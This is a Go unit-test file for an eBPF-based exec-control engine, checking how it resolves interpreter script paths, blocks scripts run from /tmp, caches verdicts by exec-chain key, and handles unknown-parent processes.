// =========================================================================

func TestEngine_InterpreterFallbackToEBPF(t *testing.T) {
	// When /proc is unavailable (process exited), the engine should fall
	// back to the eBPF-captured script_argv for interpreter events.
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit:    100,
		RateBurst:    200,
		AIQueue:      aiQueue,
		Interpreters: []string{"python3"},
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	if err := eng.rules.LoadFromBytes([]byte(tmpScriptBlockRules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	// PID 99999 doesn't exist — FindScriptPath will return "".
	// The engine should fall back to the eBPF script_argv field.
	ev := makeEventWithScriptArgv("/usr/bin/python3", "/tmp/evil.py")
	ev.Pid = 99999
	ev.InodeNumber = 777
	ev.DeviceId = 1

	verdict := eng.Process(context.Background(), ev)
	if verdict.Action != ActionBlock {
		t.Errorf("Action = %v, want ActionBlock (fallback to eBPF script_argv)", verdict.Action)
	}
	if verdict.RuleName != "tmp-script-block" {
		t.Errorf("RuleName = %q, want %q", verdict.RuleName, "tmp-script-block")
	}
	if verdict.ScriptPath != "/tmp/evil.py" {
		t.Errorf("ScriptPath = %q, want %q", verdict.ScriptPath, "/tmp/evil.py")
	}
}

func TestEngine_InterpreterFlagIgnored(t *testing.T) {
	// When eBPF script_argv contains a flag (e.g. "-c"), it should be
	// ignored (not treated as a script path).
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit:    100,
		RateBurst:    200,
		AIQueue:      aiQueue,
		Interpreters: []string{"bash"},
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	if err := eng.rules.LoadFromBytes([]byte(tmpScriptBlockRules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	// script_argv = "-c" (a flag, not a path) — should NOT match.
	ev := makeEventWithScriptArgv("/usr/bin/bash", "-c")
	ev.Pid = 99999
	ev.InodeNumber = 888
	ev.DeviceId = 1

	verdict := eng.Process(context.Background(), ev)
	if verdict.Action == ActionBlock {
		t.Error("Action = ActionBlock, want non-block — flag in script_argv should be ignored")
	}
	if verdict.ScriptPath != "" {
		t.Errorf("ScriptPath = %q, want empty (flag should be discarded)", verdict.ScriptPath)
	}
}

func TestEngine_InterpreterCacheByScriptInode(t *testing.T) {
	// With the compound exec-chain key, two different scripts run by the same
	// interpreter under the same parent will share the same cache key:
	// (parent_hash, interpreter_hash).
	//
	// Script-level differentiation is a Tier 2 CEL concern (script_path field).
	// This test documents that the Tier 1 cache correctly uses the exec-chain
	// key, which means the second call will hit the cache from the first when
	// the interpreter and parent are the same (intended behavior §ADR-exec-chain).
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit:    100,
		RateBurst:    200,
		AIQueue:      aiQueue,
		Interpreters: []string{"python3"},
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	if err := eng.rules.LoadFromBytes([]byte(tmpScriptBlockRules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ctx := context.Background()

	// Script 1: /opt/safe/app.py — no match, goes to cache as ALLOW.
	ev1 := makeEventWithScriptArgv("/usr/bin/python3", "/opt/safe/app.py")
	ev1.Pid = 99999
	ev1.InodeNumber = 100 // interpreter inode
	ev1.DeviceId = 1

	v1 := eng.Process(ctx, ev1)
	if v1.Action == ActionBlock {
		t.Fatal("safe script was unexpectedly blocked")
	}

	// Script 2: /tmp/evil.py — rule matches, but the Tier 1 cache may have
	// already been populated by script 1 (same exec-chain key). This is the
	// intended behavior: both scripts map to
	// (parent_hash=zeros, child_hash=interpreter_hash), so the cache is shared.
	// Script content inspection must be done in Tier 2 rules (script_path field).
	// AND the script path can't be stat'd.
	//
	// In production, the process is alive (sleeping), so FindScriptPath
	// succeeds, and ResolvePathToInode succeeds on the real file, giving
	// us the script's inode. This test documents the degraded behavior.
	ev2 := makeEventWithScriptArgv("/usr/bin/python3", "/tmp/evil.py")
	ev2.Pid = 99998
	ev2.InodeNumber = 100 // same interpreter inode
	ev2.DeviceId = 1

	v2 := eng.Process(ctx, ev2)

	// With the fallback path, ResolvePathToInode("/tmp/evil.py") will
	// likely fail (file doesn't exist in test), so the key stays as the
	// interpreter inode → cache hit → ALLOW. This documents the known
	// limitation.
	t.Logf("Script 2 verdict: Action=%v, Tier=%d (exec-chain cache shared by design)", v2.Action, v2.Tier)
}

func TestEngine_VerdictIncludesScriptPath(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit:    100,
		RateBurst:    200,
		AIQueue:      aiQueue,
		Interpreters: []string{"python3"},
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	ctx := context.Background()

	// Non-interpreter binary: ScriptPath should be empty.
	ev1 := zaskebpf.ZaskEvent{InodeNumber: 300, DeviceId: 1, Pid: 99999}
	copy300 := "/usr/bin/ls"
	for i := 0; i < len(copy300) && i < len(ev1.Argv); i++ {
		ev1.Argv[i] = int8(copy300[i])
	}
	v1 := eng.Process(ctx, ev1)
	if v1.ScriptPath != "" {
		t.Errorf("non-interpreter: ScriptPath = %q, want empty", v1.ScriptPath)
	}

	// Interpreter with eBPF script_argv: ScriptPath should be populated.
	ev2 := makeEventWithScriptArgv("/usr/bin/python3", "/opt/app/main.py")
	ev2.Pid = 99998
	ev2.InodeNumber = 301
	ev2.DeviceId = 1

	v2 := eng.Process(ctx, ev2)
	if v2.ScriptPath != "/opt/app/main.py" {
		t.Errorf("interpreter: ScriptPath = %q, want %q", v2.ScriptPath, "/opt/app/main.py")
	}
}

func TestEngine_SetScriptArgv(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	ev := makeEventWithScriptArgv("/usr/bin/python3", "/old/path.py")
	eng.setScriptArgv(&ev, "/new/resolved/path.py")

	got := ev.GetScriptArgv()
	if got != "/new/resolved/path.py" {
		t.Errorf("after setScriptArgv: GetScriptArgv() = %q, want %q", got, "/new/resolved/path.py")
	}
}

func TestEngine_SetScriptArgvCleansOldValue(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	// Start with a LONGER path, then overwrite with a SHORTER one.
	// The old value must be completely erased.
	ev := makeEventWithScriptArgv("/usr/bin/python3", "/very/long/old/path/to/script.py")
	eng.setScriptArgv(&ev, "/x.py")

	got := ev.GetScriptArgv()
	if got != "/x.py" {
		t.Errorf("after overwrite: GetScriptArgv() = %q, want %q", got, "/x.py")
	}
}

// TestEngine_ParentHashUnavailableSentinel verifies (§ADR-exec-chain) that
// when ParentHashAvailable == 0 (parent started before ZASK or is PID 1),
// the engine still writes an AllowExec verdict with an all-zeros parent hash
// (unknown-parent sentinel), enabling the kernel fast-path for such processes.
func TestEngine_ParentHashUnavailableSentinel(t *testing.T) {
	log := zerolog.Nop()
	ml := &mockLoader{}

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 100,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	// HashAvailable=1 (IMA hash present) but ParentHashAvailable=0 (parent
	// started before ZASK — unknown parent sentinel).
	ev := makeEventWithHash(0x77)
	ev.ParentHashAvailable = 0 // default, but explicit for clarity
	ev.Pid = 100
	for i, b := range []byte("/usr/bin/ls") {
		ev.Argv[i] = int8(b)
	}

	eng.Process(context.Background(), ev)

	if len(ml.allowed) == 0 {
		t.Fatal("AllowExec was NOT called for unknown-parent event")
	}

	key := ml.allowed[0]

	// ParentHash must be all-zeros (unknown-parent sentinel).
	var zeroHash [32]uint8
	if key.ParentHash != zeroHash {
		t.Errorf("ParentHash = %x, want all-zeros (unknown-parent sentinel)", key.ParentHash)
	}

	// ChildHash must be the interpreter hash from makeEventWithHash.
	if key.ChildHash[0] != 0x77 {
		t.Errorf("ChildHash[0] = %x, want 0x77", key.ChildHash[0])
	}
}
